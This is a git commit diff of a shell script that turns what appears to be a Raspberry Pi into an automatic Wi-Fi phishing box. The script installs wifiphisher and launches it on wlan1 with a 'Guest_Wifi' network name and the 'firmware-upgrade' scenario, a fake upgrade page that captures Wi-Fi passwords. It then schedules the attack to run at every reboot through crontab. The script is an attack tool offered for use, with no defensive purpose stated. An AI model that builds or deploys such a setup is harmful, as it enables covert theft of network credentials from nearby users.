3bda7b2cd7aaaebad82bc2254c25db5268cc94da
Easty101 <106346360+Easty101@users.noreply.github.com>
2023-12-20 19:10:38 +0100

    Add files via upload

--- wifi-pi.sh
+++ wifi-pi.sh
@@ -1,14 +1,14 @@
 #!bin/sh
 echo lol
 wait 3
+cd 
 #installation of all programms and dependencies
-sudo apt-get update -y
-sudo apt-get full-upgrade -y
-sudo apt-get install git -y
+sudo apt-get update
+sudo apt-get full-upgrade
+sudo apt-get install pip
+sudo apt-get install libnl-genl-3-dev
+sudo apt-get install libssl-dev
 sudo git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
-sudo apt-get install pip -y
-sudo apt-get install libnl-genl-3-dev -y
-sudo apt-get install libssl-dev -y
 cd wifiphisher # Switch to tool's directory
 sudo python3 setup.py install # Install any dependencies
 
@@ -23,7 +23,8 @@ sudo wifiphisher -i wlan1 -e Guest_Wifi -p firmware-upgrade -nD --logging
 ' > autostart.sh
 
 # Path to your script
-script_path="/home/pi/autostart.sh"
+script_dir=$(dirname "$(readlink -f "$0")")
+script_path="$script_dir/autostart.sh"
 
 # Add a line to crontab to run the script at boot
 (crontab -l ; echo "@reboot $script_path") | crontab -
